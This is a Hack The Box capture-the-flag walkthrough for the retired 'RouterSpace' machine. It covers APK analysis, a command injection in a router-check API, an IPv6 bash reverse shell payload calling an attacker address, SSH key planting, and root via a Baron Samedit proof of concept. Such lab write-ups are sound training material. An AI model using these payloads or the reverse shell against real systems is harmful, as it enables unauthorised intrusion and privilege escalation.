# HTB: RouterSpace Walkthrough

## Box Info
- **Name:** RouterSpace  
- **OS:** Linux  
- **Difficulty:** Easy  
- **Release Date:** 26 Feb 2022  
- **Retire Date:** 09 Jul 2022  
- **Points:** 20

---

## Recon

### Nmap Scan
```
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.148
nmap -p 22,80 -sCV 10.10.11.148
```
- Ports Open: 22 (SSH), 80 (HTTP)
- Unknown SSH version with fingerprint
- HTTP returns headers like `X-Powered-By: RouterSpace`, no default CMS or tech found.

### Website - Port 80
- Landing page offers a **RouterSpace.apk** for download
- X-Headers are custom, possibly unique to this server

### Directory Brute Force
```
feroxbuster -u http://10.10.11.148 -X 'Suspicious activity detected !!!'
```
- `/cgi-bin`, `/admin`, `/images`, `/scripts`, `/includes` all found
- Nothing actionable from static analysis alone

---

## Android App Analysis

### APK Static Analysis
- Extract using apktool:
```
apktool d RouterSpace.apk
```
- Found domain `routerspace.htb` in cert
- App uses React Native
- Key JavaScript file: `assets/index.android.bundle`

### APK Dynamic Analysis
- Used **Genymotion** with API 27 to bypass HTTPS issues
- Set up proxy to forward traffic through Burp
- Observed endpoint:
```
POST /api/v4/monitoring/router/dev/check/deviceAccess
```
- Payload: `{ "ip": "<input>" }`

### SSTI / Command Injection
- Endpoint is vulnerable to **Command Injection**
- Successful payload: `{"ip": "$(id)"}`
- RCE confirmed, reverse shell blocked by firewall
- **IPv6 bypass** worked:
```
$(bash -c 'bash -i >& /dev/tcp/dead:beef:2::1004/443 0>&1')
```

### Establish SSH Access
- Used RCE to inject SSH key into `/home/paul/.ssh/authorized_keys`
- Connected as `paul` via SSH

---

## Privilege Escalation

### Enumeration with LinPEAS
- CVE findings:
  - **CVE-2021-3156 (Baron Samedit)**: vulnerable
  - **CVE-2021-4034 (PwnKit)**: false positive (not SUID)
  - **CVE-2021-3560 (Polkit)**: missing components
  - **CVE-2021-22555 (NetFilter)**: exploit failed

### Exploit CVE-2021-3156 (Baron Samedit)
- Cloned PoC: https://github.com/CptGibbon/CVE-2021-3156
- Built locally and transferred to target
```
make
./exploit
```
- Got root shell!


## Notes
- Key concepts: APK reverse engineering, React Native apps, Genymotion + Burp proxy, command injection, classic sudo vulnerability (Baron Samedit)
- IPv6 reverse shell bypass was a smart trick
- Emulation + dynamic analysis was the hardest setup
